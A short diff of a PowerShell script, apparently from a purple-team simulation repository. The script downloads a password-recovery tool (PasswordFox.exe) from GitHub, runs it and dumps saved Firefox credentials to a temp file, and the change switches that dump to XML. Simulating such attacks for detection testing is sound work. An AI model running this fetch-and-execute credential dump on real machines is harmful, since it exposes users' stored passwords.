@@ -18,13 +18,13 @@ else{
     $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PasswordFox.exe"
 }
 
-$dumpfile = "$env:tmp\firefoxpasswords.txt"
+$dumpfile = "$env:tmp\firefoxpasswords.xml"
 $outfile = "$env:tmp\firefoxpass.exe"
 try {
     Invoke-WebRequest $url -OutFile $outfile 
     if (Test-Path $outfile){
         Write-Host -ForegroundColor Green "Success: PasswordFox.exe downloaded to $outfile"
-        & $outfile /stext $dumpfile
+        & $outfile /sxml $dumpfile
         sleep 1
     }
     else{
